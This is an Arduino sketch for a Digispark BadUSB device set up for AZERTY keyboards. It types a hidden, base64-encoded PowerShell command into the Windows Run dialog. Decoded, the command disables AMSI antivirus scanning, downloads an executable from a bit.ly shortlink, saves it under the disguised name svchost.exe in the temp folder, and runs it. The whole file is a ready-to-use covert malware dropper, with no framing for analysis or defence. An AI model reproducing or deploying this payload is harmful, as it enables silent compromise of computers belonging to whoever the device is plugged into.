// Made with <3 by 942
// Light Version for AZERTY Keyboard
// Very simple c++ ,  you can upgrade it.

#include <avr/pgmspace.h>
#include "DigiKeyboardFr.h"

// Manual defines
#undef KEY_R
#undef MOD_GUI_LEFT  
#undef KEY_ENTER

#define KEY_R 21
#define MOD_GUI_LEFT 8
#define KEY_ENTER 40

void setup() {
  // Wait for USB Init
  DigiKeyboardFr.delay(2000);
  
  // Win+R
  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardFr.delay(500);
  
  // PowerShell command in several parts to reduce RAM usage
  DigiKeyboardFr.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass -Enc "));
  DigiKeyboardFr.print(F("WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAkAGEAPQAnAGgAdAB0AHAAcwA6AC8ALwBiAGkAdAAuAGwAeQAvADQANwBoADgAdQBMAEkAJwA7ACQAYgA9ACcAJQBUAEUATQBQACUAXABzAHYAYwBoAG8AcwB0AC4AZQB4AGUAJwA7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAGEAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAGIAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABiAA=="));
  
  DigiKeyboardFr.delay(300);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  
  // Block
  while(1) {}
}

void loop() {}
